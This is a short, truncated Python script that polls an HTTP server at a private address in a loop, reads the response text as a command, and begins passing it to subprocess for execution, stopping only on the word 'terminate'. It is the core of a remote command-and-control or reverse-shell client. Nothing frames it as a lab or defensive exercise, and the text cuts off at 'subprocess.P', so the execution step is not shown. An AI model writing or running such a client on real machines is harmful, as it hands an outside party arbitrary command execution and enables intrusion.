import requests
import subprocess
import time

while True:
    req = requests.get("http://192.168.0.152:8080")
    command = req.text
    
    if "terminate" in command:
        break
    else:
        CMD = subprocess.P